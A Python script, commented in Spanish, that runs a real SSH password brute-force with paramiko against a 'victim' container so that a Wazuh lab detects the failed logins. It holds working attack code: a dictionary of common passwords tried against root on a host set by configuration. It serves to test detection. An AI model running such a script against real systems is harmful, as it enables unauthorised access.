"""
Atacante: fuerza bruta SSH real contra el contenedor víctima (con paramiko).

# Genera tráfico SSH REAL -> autenticaciones fallidas reales en el sshd de la víctima
# -> el sshd las loguea -> Wazuh las ve y dispara la regla de brute force.
# No es una simulación de logs: es el ataque de verdad, en chiquito.
"""
from __future__ import annotations

import os
import sys
import time

import paramiko

TARGET_HOST = os.getenv("TARGET_HOST", "victim")
TARGET_PORT = int(os.getenv("TARGET_PORT", "22"))
TARGET_USER = os.getenv("TARGET_USER", "root")
ATTEMPTS = int(os.getenv("ATTEMPTS", "15"))
DELAY = float(os.getenv("DELAY", "0.4"))  # segundos entre intentos

# Diccionario de contraseñas típico de un ataque real (todas incorrectas a propósito).
PASSWORDS = [
    "123456", "password", "root", "admin", "toor", "qwerty", "letmein",
    "12345678", "111111", "root123", "password1", "changeme", "welcome",
    "1q2w3e4r", "admin123", "P@ssw0rd", "iloveyou", "monkey", "dragon", "master",
]


def try_login(user: str, password: str) -> bool | None:
    """Un intento de login. True=éxito, False=credencial inválida, None=error de red."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            TARGET_HOST,
            port=TARGET_PORT,
            username=user,
            password=password,
            timeout=5,
            allow_agent=False,
            look_for_keys=False,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as exc:  # noqa: BLE001 — errores de red no deben cortar el ataque
        print(f"  [!] error de conexión: {exc}", file=sys.stderr)
        return None
    finally:
        client.close()


def main() -> None:
    print(f"[*] Fuerza bruta SSH -> {TARGET_USER}@{TARGET_HOST}:{TARGET_PORT} ({ATTEMPTS} intentos)")

    # Esperamos a que el sshd de la víctima esté escuchando.
    for _ in range(30):
        if try_login("wait-probe", "wait-probe") is not None:
            break
        print("  [.] esperando a que la víctima levante SSH...")
        time.sleep(2)

    fails = 0
    for i, password in enumerate(PASSWORDS[:ATTEMPTS], start=1):
        result = try_login(TARGET_USER, password)
        if result is True:
            print(f"  [+] intento {i}: ÉXITO con '{password}' (no debería pasar en el lab)")
            break
        elif result is False:
            fails += 1
            print(f"  [-] intento {i}: fallo con '{password}'")
        time.sleep(DELAY)

    print(f"[*] Ataque terminado. {fails} autenticaciones fallidas generadas.")


if __name__ == "__main__":
    main()
